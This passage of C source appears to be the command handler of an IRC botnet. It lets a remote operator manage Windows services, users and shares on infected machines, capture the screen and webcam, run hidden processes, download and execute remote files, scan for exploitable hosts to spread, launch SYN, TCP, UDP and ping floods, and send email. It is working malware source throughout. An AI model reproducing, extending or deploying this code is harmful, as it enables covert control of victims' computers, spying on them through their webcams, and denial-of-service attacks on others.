				if((!noadvapi32) || (!nonetapi32)) {
					if (x != NULL) {
						char *y = NULL;
						if (a[s+2]) // get the full service name if exists
							y = strstr(x, a[s+2]);
						if (strcmp("start", a[s+1]) == 0)
							if (a[s+2])
								sprintf(sendbuf, "%s", Services(NET_START, y));
							else {
								if (ListServices(sock, a[2], notice))
									sprintf(sendbuf, "[NET]: Service list completed.");
								else
									sprintf(sendbuf, "[NET]: Service list failed.");
							}
						else if (strcmp("stop", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_STOP, y));
						else if (strcmp("pause", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
						else if (strcmp("continue", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
						else if (strcmp("delete", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_DELETE, y));
						else if (strcmp("share", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
								else
									sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
							} else {
								if (ListShares(sock, a[2], notice))
									sprintf(sendbuf, "[NET]: Share list completed.");
								else
									sprintf(sendbuf, "[NET]: Share list failed.");
							}
						}
						else if (strcmp("user", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
								else {
									if (a[s+3])
										sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
									else
										sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
								}
							} else {
								if (ListUsers(sock, a[2], notice))
									sprintf(sendbuf, "[NET]: User list completed.");
								else
									sprintf(sendbuf, "[NET]: User list failed.");
							}
						}
						else if (strcmp("send", a[s+1]) == 0) {
							if (a[s+2])
								sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
							else
								sprintf(sendbuf, "[NET]: No message specified.");
						}
						else
							sprintf(sendbuf,"[NET]: Command unknown.");
					}
				} else
					sprintf(sendbuf, "[NET]: Failed to load advapi32.dll or netapi32.dll.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			
				return repeat;
			}
			#endif
			#ifndef NO_CAPTURE
			else if (strcmp("capture", a[s]) == 0 || strcmp("cap", a[s]) == 0) {
				if (strcmp(a[s+1],"screen") == 0) {
					if (a[s+2]) {
						if (Capture(a[s+2]) == TRUE)
							sprintf(sendbuf,"[CAPTURE]: Screen capture saved to: %s.", a[s+2]);
						else
							sprintf(sendbuf,"[CAPTURE]: Error while capturing screen.");
					} else
						sprintf(sendbuf,"[CAPTURE]: No filename specified for screen capture.");
				}
				if (strcmp(a[s+1],"drivers") == 0) {
					char buffer[1024],svName[256], svComment[IRCLINE];

					for (i=0; i < 10; i++) {
						if(fcapGetDriverDescription(i, svName, 255, svComment, (IRCLINE-1))) {
							sprintf(buffer, "[CAPTURE]: Driver #%d - %s - %s.", i, svName, svComment);
							irc_privmsg(sock,a[2],buffer,notice);
						}
					}
					sprintf(sendbuf,"[CAPTURE]: Driver list complete.");
				}
				if (strcmp(a[s+1],"frame") == 0) {
					if (a[s+2] && a[s+3] && a[s+4] && a[s+5]) {
						if (CaptureFrame(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5])) == 0)
							sprintf(sendbuf,"[CAPTURE]: Webcam capture saved to: %s.", a[s+2]);
						else
							sprintf(sendbuf,"[CAPTURE]: Error while capturing from webcam.");
					} else
						sprintf(sendbuf,"[CAPTURE]: Invalid parameters for webcam capture.");
				}
				if (strcmp(a[s+1],"video") == 0) {
					if (a[s+2] && a[s+3] && a[s+4] && a[s+5] && a[s+6]) {
						if (CaptureVideo(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5]), atoi(a[s+6])) == 0)
							sprintf(sendbuf,"[CAPTURE]: Amateur video saved to: %s.", a[s+2]);
						else
							sprintf(sendbuf,"[CAPTURE]: Error while capturing amateur video from webcam.");

					} else
						sprintf(sendbuf,"[CAPTURE]: Invalid parameters for amateur video capture.");
				}
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp("gethost", a[s]) == 0 || strcmp("gh", a[s]) == 0) { 
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"[MAIN]: Gethost: %s, Command: %s", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"[MAIN]: Unable to extract Gethost command.");							
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Gethost: %s.",a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						addalias(a[s+1], y);
						sprintf(sendbuf,"[MAIN]: Alias added: %s.", a[s+1]);
						if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						sprintf(sendbuf,"[MAIN]: Privmsg: %s.",a[s+1]);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}

				return repeat;
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("[MAIN]: Cycle.");

				return repeat;
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						sprintf(sendbuf,"[MAIN]: Mode change: %s",y);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
						irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", y);

				}

				return repeat;
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
						irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", sendbuf);
				}

				return repeat;
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].csock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"[MAIN]: Repeat: %s", r);
						addlog(sendbuf);

						if (atoi(a[s+1]) > 0) 
							return repeat + atoi(a[s+1]); 
						else 
							return repeat;
					} else {
						sprintf(sendbuf,"[MAIN]: Repeat not allowed in command line: %s", r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					addlog("[MAIN]: Delay.");
					return repeat + 1;
				}

				return 1;
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("t4md3d", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) 
					return 1;
				char tempdir[MAX_PATH];
				GetTempPath(sizeof(tempdir), tempdir);
				ds ds;
				sprintf(ds.dest, "%s%s.exe", tempdir, nick); // FIX ME: remove double \\ but check
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				ds.update = 1;
				ds.silent = silent;
				ds.notice = notice;
				ds.expectedcrc = 0;
				ds.filelen = 0;
				if (a[s+3]) 
					ds.expectedcrc=strtoul(a[s+3],0,16);
				if (a[s+4]) 
					ds.filelen=atoi(a[s+4]);
				ds.encrypted=(parameters['e']);

				sprintf(sendbuf, "[UPDATE]: Downloading update from %s.", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				ds.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				strncpy(threads[ds.threadnum].file,ds.url,sizeof(threads[ds.threadnum].file)-1);
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);

				while(ds.gotinfo == FALSE)
					Sleep(50);

				return repeat;
			}
			#endif
			// FIX ME: Add execute with output, rip from my IROFFER
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) {
							sprintf(sendbuf,"[EXEC]: Couldn't execute file.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						} else
							sprintf(sendbuf,"[EXEC]: Commands: %s",y);
				}
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_HTTPD
			else if (strcmp("httpserver", a[s]) == 0 || strcmp("http", a[s]) == 0) {
				if ((HTTP_server(GetIP(sock),atoi(a[s+1]),a[s+2])) == -1)
					sprintf(sendbuf,"[HTTP]: Server failed to start.");
				else 
					sprintf(sendbuf,"[HTTP]: Server started on IP: %s:%d, Directory: %s\\.", GetIP(sock), atoi(a[s+1]), a[s+2]);
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_TFTPD
			else if (strcmp("tftpserver", a[s]) == 0 || strcmp("tftp", a[s]) == 0) {
				if (findthreadid(TFTP_THREAD) > 0)
					sprintf(sendbuf ,"[TFTP]: Already running.");
				else {
					TFTP tftp;
					tftp.threads=0;
					strncpy(tftp.filename, a[s+1], sizeof(tftp.filename)-1);
					strncpy(tftp.requestname, a[s+2], sizeof(tftp.requestname)-1);
					strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
					tftp.notice = notice;
					tftp.silent = silent;
					tftp.info = FALSE;
					tftp.socket = sock;

					sprintf(sendbuf, "[TFTP]: Server started on Port: %d, File: %s, Request: %s.", tftpport, tftp.filename, tftp.requestname);

					tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
					strncpy(threads[tftp.threadnum].file,tftp.filename,sizeof(threads[tftp.threadnum].file)-1);
					threads[tftp.threadnum].port = tftpport;
					threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (void *)&tftp, 0, &id);

					while (tftp.info == FALSE) 
						Sleep(50);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_FINDFILE
			else if (strcmp("findfile", a[s]) == 0 || strcmp("ff", a[s]) == 0) { 
				FFIND ffind;
				sprintf(ffind.filename,a[s+1]);
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						sprintf(ffind.dirname,y);
				}
				sprintf(ffind.chan, a[2]);
				ffind.sock = sock;
				ffind.notice = notice;
				ffind.silent = silent;

				//if (!silent) _snprintf(sendbuf, sizeof(sendbuf),"[FINDFILE]: Searching for file: %s in: %s.", ffind.filename, ffind.dirname);
				//addlog(sendbuf);

				ffind.threadnum = addthread(sendbuf, FIND_THREAD, NULL);
				threads[ffind.threadnum].tHandle = CreateThread(NULL, 0, &FindFileThread, (void *)&ffind, 0, &id);

				while (ffind.gotinfo == FALSE)
					Sleep(50);

				return 1;
			}
			#endif

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);

				sprintf(sendbuf, "[CLONES]: Created on %s:%d, in channel %s.", irc.host, irc.port, irc.channel);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);

				while(irc.gotinfo == FALSE)
					Sleep(50);

				return repeat;
			}
			#ifndef NO_DDOS
			else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[DDoS]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SYN
			else if (strcmp("5yn", a[s]) == 0) {
				SYNT sin;
				strncpy(sin.ip, a[s+1], sizeof(sin.ip)-1);
				strncpy(sin.port, a[s+2], sizeof(sin.port)-1);
				strncpy(sin.length, a[s+3], sizeof(sin.length)-1);
				strncpy(sin.chan, a[2], sizeof(sin.chan)-1);
				sin.notice = notice;
				sin.silent = silent;
				sin.socket = sock;

				sprintf(sendbuf, "[SYN]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				sin.threadnum = addthread(sendbuf,SYN_THREAD,NULL);
				threads[sin.threadnum].tHandle = CreateThread(NULL, 0, &synthread, (void *)&sin, 0, &id);

				while(sin.gotinfo == FALSE)
					Sleep(50);

				return repeat;
			}
			#endif
			#ifndef NO_DOWNLOAD
			else if (strcmp("naz3l", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) 
					ds.run = atoi(a[s+3]); 
				else 
					ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);

				ds.update = 0;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				ds.encrypted=(parameters['e']);
				if (a[s+4]) ds.expectedcrc=strtoul(a[s+4],0,16);		//CRC check..
				if (a[s+5]) ds.filelen=atoi(a[s+5]);

				sprintf(sendbuf, "[DOWNLOAD]: Downloading %s.", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				ds.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				strncpy(threads[ds.threadnum].file,ds.url,sizeof(threads[ds.threadnum].file)-1);
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);

				while(ds.gotinfo == FALSE)
					Sleep(50);
				
				return repeat;
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;

				sprintf(sendbuf, "[REDIRECT]: TCP Redirect created on Port %d to %s:%d.", rs.lport, rs.dest, rs.port);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				rs.threadnum = addthread(sendbuf,REDIRECT_THREAD,NULL);
				threads[rs.threadnum].tHandle = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);

				while(rs.gotinfo == FALSE)
					Sleep(50);
				
				return 1;
			}
			#endif 
			#ifndef NO_SCAN
			else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
				scans sscan;
				sscan.addy.S_un.S_addr = finet_addr(a[s+1]);
				sscan.port = atoi(a[s+2]);
				sscan.delay = atoi(a[s+3]);
				sscan.sock = sock;
				sscan.notice = notice;;
				strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);

				sprintf(sendbuf, "[SCAN]: Port Scan started %s:%d with a delay of %dms", finet_ntoa(sscan.addy), sscan.port, sscan.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				sscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				threads[sscan.threadnum].tHandle = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
				while(sscan.gotinfo == FALSE)
					Sleep(50);

				return 1;
			}
			#endif 
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (threads[atoi(a[s+1])].cnick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].csock, a[s+2], y, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].cnick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (threads[atoi(a[s+1])].cnick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].csock, a[s+2], sendbuf, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], threads[atoi(a[s+1])].cnick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp("advscan", a[s]) == 0 || strcmp("asc", a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 3)?(3):(advscan.delay));
					advscan.delay = ((advscan.delay > 30)?(30):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;
						}
					}

					if (a[s+5]) {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN sin;
							int sin_size=sizeof(SOCKADDR_IN);
							fgetsockname(sock,(SOCKADDR*)&sin,&sin_size);
							sin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(sin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip;
								if (parameters['a']) 
									extractip=3;
								else
									extractip=2;
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip,c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							// error
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan, sizeof(advscan.chan), a[2]);

					sprintf(sendbuf, "[SCAN]: %s, IP:%s:%d %d sec delay for:%d min / %d threads.", 
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					threads[advscan.threadnum].port = advscan.port;
					threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (void *)&advscan, 0, &id);
					while(advscan.gotinfo == FALSE)
						Sleep(50);

					return 1;
				}
			}
			#endif
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				ps udps;
				udps.silent = silent;
				udps.notice = notice;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) 
					udps.port = atoi(a[s+5]); 
				else 
					udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;

				sprintf(sendbuf, "[UDP]: Sending %d packets to: %s. Packet size: %d, Delay: %d(ms).", udps.num, udps.host, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				udps.threadnum = addthread(sendbuf,UDP_THREAD,NULL);
				threads[udps.threadnum].tHandle = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(udps.gotinfo == FALSE)
					Sleep(50);
				
				return repeat;
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					pings.notice = notice;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;

					sprintf(sendbuf, "[PING]: Sending %d pings to %s. packet size: %d, timeout: %d(ms).", pings.num, pings.host, pings.size, pings.delay);
					pings.threadnum = addthread(sendbuf,PING_THREAD,NULL);
					threads[pings.threadnum].tHandle = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(pings.gotinfo == FALSE)
						Sleep(50);
				} else 
					strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			#ifndef NO_TCP
			else if (strcmp("tcpflood", a[s]) == 0 || strcmp("tcp", a[s]) == 0) {
				TCPFLOOD tcpflood;
				_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
				if (strcmp("syn",tcpflood.type) == 0 || strcmp("ack",tcpflood.type) == 0 || strcmp("random",tcpflood.type) == 0) {
					if ((tcpflood.time = atoi(a[s+4])) > 0) {
						_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
						_snprintf(tcpflood.ip,sizeof(tcpflood.ip),a[s+2]);
						tcpflood.port = atoi(a[s+3]);
						tcpflood.spoof = ((parameters['r'])?(TRUE):(FALSE));
						tcpflood.sock = sock;
						_snprintf(tcpflood.chan,sizeof(tcpflood.chan),a[2]);
						tcpflood.notice = notice;
						tcpflood.silent = silent;

						_snprintf(sendbuf,sizeof(sendbuf),"[TCP]: %s %s flooding: (%s:%s) for %s seconds.", ((tcpflood.spoof)?("Spoofed"):("Normal")), a[s+1], a[s+2], a[s+3], a[s+4]);
						tcpflood.threadnum = addthread(sendbuf,TCP_THREAD,NULL);
						if (threads[tcpflood.threadnum].tHandle = CreateThread(NULL, 0, &TcpFloodThread, (LPVOID)&tcpflood, 0, &id)) {
							while(tcpflood.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[TCP]: Failed to start flood thread, error: <%d>.", GetLastError());
					} else
						sprintf(sendbuf,"[TCP]: Invalid flood time must be greater than 0.");
				} else
					sprintf(sendbuf,"[TCP]: Invalid flood type specified.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
		    else if (strcmp("email", a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256], sender_email[256], recp_email[256], subject[256], myBuf[256], BigBuf[1024];
				int port, nRet;

				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				fWSAStartup(version, &wsaData);

				LPHOSTENT lpHostEntry;
				lpHostEntry = fgethostbyname(server);

				SOCKET MailSocket;
				MailSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = fhtons((unsigned short)port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = fconnect(MailSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = fsend(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				fclosesocket(MailSocket);
				fWSACleanup();

				sprintf(sendbuf, "[EMAIL]: Message sent to %s.",recp_email);
